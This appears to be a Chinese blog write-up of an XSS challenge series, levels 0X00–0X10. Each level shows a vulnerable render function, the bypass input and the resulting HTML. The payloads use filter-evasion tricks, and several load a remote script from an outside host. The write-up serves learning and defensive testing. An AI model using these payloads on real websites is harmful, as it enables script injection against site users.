<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处没有什么过滤，最基础的<strong>XSS</strong>攻击。</p>
<h5 id="input-code">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x01">0X01</h4>
<h5 id="server-code-1">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/textarea&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
此处使用<strong>HTML</strong>中的**
<textarea>
<p>**标签来接收输入的字符串。</p>
<h5 id="笔记">笔记</h5>
**
<textarea>
<p>** 标签定义一个多行的文本输入控件。</p>
<p>文本区域中可容纳无限数量的文本，其中的文本的默认字体是等宽字体【通常是<strong>Courier</strong>。</p>
因此绕过便需要使**
<textarea>** 提前闭合，那么在输入的恶意代码前加上**</textarea>
<p>** 便可。</p>
<h5 id="input-code-1">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-1">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x02">0X02</h4>
<h5 id="server-code-2">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依旧没过滤，闭合双引号及<strong>input</strong>标签就可以了。</p>
<h5 id="input-code-2">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-2">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="x03">0X03</h4>
<h5 id="server-code-3">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处使用正则匹配了<strong>()</strong>并替换为空格。</p>
<p>那么只能使用HTML对<strong>()</strong>进行编码。</p>
<p>因此需要使用到<strong>onerror</strong>事件。</p>
<h5 id="笔记-1">笔记</h5>
<p><strong>onerror</strong>
事件会在文档或图像加载过程中发生错误时被触发。</p>
<h5 id="input-code-3">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">javascript:alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-3">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">javascript:alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x04">0X04</h4>
<h5 id="server-code-4">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()**]/g</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripBracketsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如0X03。</p>
<h5 id="input-code-4">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">javascript:alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-4">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">javascript:alert&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x05">0X05</h4>
<h5 id="server-code-5">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/--&gt;/g</span>, <span class="string">&#x27;😂&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这儿使用<strong>replace</strong>函数将<strong>--&gt;</strong>过滤了，防止构造闭合。</p>
<p>但是可以使用<strong>--!&gt;</strong>来跳过注释。</p>
<h5 id="input-code-5">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-5">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --!&gt;&lt;script&gt;alert(1)&lt;/script&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x06">0X06</h4>
<h5 id="server-code-6">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处的<strong>.</strong>匹配的是除了换行符***之外的字符串，所以换行就行了。</p>
<p>并且这里<strong>return</strong>回去的是一个<strong>input</strong>标签。</p>
<p>那么可以使用其中的<strong>type</strong>属性进行一些操作，比如改成<strong>img</strong>再使用上面的<strong>oneerror</strong>或者改成<strong>button</strong>然后使用<strong>onclick</strong>操作。</p>
<h5 id="input-code-6">Input Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">type=<span class="string">&quot;image&quot;</span> src=<span class="string">&quot;&quot;</span> onerror</span><br><span class="line">=<span class="string">&quot;alert(1)&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">type=<span class="string">&quot;button&quot;</span> </span><br><span class="line">onclick</span><br><span class="line">=<span class="string">&quot;javascritp:alert(1)&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-6">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span></span></span><br><span class="line"><span class="tag">=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">onclick</span></span></span><br><span class="line"><span class="tag">=<span class="string">&quot;javascritp:alert(1)&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x07">0X07</h4>
<h5 id="server-code-7">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line">  input = input.<span class="title function_">replace</span>(stripTagsRe, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里过滤了<strong>&lt;</strong>开头<strong>&gt;</strong>结尾的字符串，因此利用容错性，不构造<strong>&gt;</strong>。</p>
<h5 id="input-code-7">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span> =<span class="string">&quot;alert(1)&quot;</span></span></span><br></pre></td></tr></table></figure>
<h5 id="html-7">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">article</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span> =<span class="string">&quot;alert(1)&quot;</span>&lt;/<span class="attr">article</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x08">0X08</h4>
<h5 id="server-code-8">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这里过滤了**
</style>
<p>**，但并没有做什么其他的匹配。</p>
<p>所以在标签<strong>&gt;</strong>之前空格或者换行即可。</p>
<h5 id="input-code-8">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-8">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      &lt;/style &gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x09">0X09</h4>
<h5 id="server-code-9">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里首先是需要匹配到<strong>https://www.segmentfault.com</strong>这一串字符。</p>
<p>然后在进行闭合<strong></script></strong>这个标签，最后的<strong>"&gt;</strong>可以使用<strong>//</strong>进行注释。</p>
<h5 id="input-code-9">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//</span><br></pre></td></tr></table></figure>
<h5 id="html-9">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>//&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0a">0X0A</h4>
<h5 id="server-code-10">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里过滤了<strong>&amp;</strong>，便不能使用<strong>HTML</strong>编码绕过。</p>
<p>还过滤了<strong>‘、“、&lt;、&gt;、/</strong>，便不能再构造闭合。</p>
<p>因此只好利用<strong>URL</strong>的**<span class="citation"
data-cites="*">@*</span>*引入外部的<strong>JavaScript</strong>文件。</p>
<h5 id="input-code-10">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.southsea.st/myjs/copyright.js</span><br></pre></td></tr></table></figure>
<h5 id="html-10">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.southsea.st&amp;#x2fmyjs&amp;#x2fcopyright.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0b">0X0B</h4>
<h5 id="server-code-11">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用<strong>toUpperCase</strong>将字符串全部转化成为了大写。</p>
<p>那么有二解。</p>
一是由于<strong>HTML</strong>大小写不敏感，所以可以直接构造**
<script>
<p><strong>标签来引入外部</strong>JavaScript<strong>文件，不过由于会转成大写因此引入的文件最好也是大写命名，因为</strong>Windows<strong>服务器对大小写不敏感而</strong>Linux**服务器对大小写敏感。</p>
<p>二是由于<strong>JavaScript</strong>大小写敏感，所以需要将<strong>JavaScript</strong>的恶意代码进行<strong>HTML</strong>编码。</p>
<h5 id="input-code-11">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://xss.southsea.st/myjs/copyright.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://XSS.southsea.st/MYJS/COPYRIGHT.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-11">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0c">0X0C</h4>
<h5 id="server-code-12">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这儿过滤了**
<script>
<p>**标签，但只过滤了一次，因此不难解决。</p>
<h5 id="input-code-12">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span> <span class="attr">src</span>=<span class="string">&quot;https://xss.southsea.st/myjs/copyright.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-12">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://XSS.southsea.st/MYJS/COPYRIGHT.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0d">0X0D</h4>
<h5 id="server-code-13">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这儿正则匹配过滤了<strong>&lt;、/、"、'</strong>这四个符号，同时输出点被<strong>//</strong>注释了。但由于只是行注释因此可以换行绕过，最后由于<strong>/</strong>被过滤因此使用<strong>--&gt;</strong>构造闭合。</p>
<h5 id="input-code-13">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
<h5 id="html-13">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">          // alert(&#x27;</span><br><span class="line">alert(1);</span><br><span class="line">--&gt;&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0e">0X0E</h4>
<h5 id="server-code-14">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这儿匹配替换<strong>&lt;</strong>开头后接字母的字符串，就是所有的标签都不能用，并且全部转了大写。</p>
<p>但是有一个漏洞，<strong>ſ</strong>不是英文字母并且转成大写以后是<strong>S</strong>。</p>
<h5 id="input-code-14">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;ſcript <span class="attr">src</span>=<span class="string">&quot;https://xss.southsea.st/myjs/copyright.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="html-14">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://XSS.southsea.st/MYJS/COPYRIGHT.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x0f">0X0F</h4>
<h5 id="server-code-15">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>虽然过滤了一堆字符，但是都在标签类，且是将字符转为<strong>HTML</strong>编码所以没啥影响，构造闭合就行了。</p>
<h5 id="input-code-15">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
<h5 id="html-15">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;<span class="symbol">&amp;#39;</span>);alert(<span class="symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x10">0X10</h4>
<h5 id="server-code-16">Server Code</h5>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处没过滤，闭合前面的标签就行了。</p>
<h5 id="input-code-16">Input Code</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1)</span><br></pre></td></tr></table></figure>
<h5 id="html-16">Html</h5>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">data</span> = <span class="string">&#x27;&#x27;</span>;<span class="title function_">alert</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="x11">0X11</h4>
<h5 id="server-code-17">Server Code</h5>
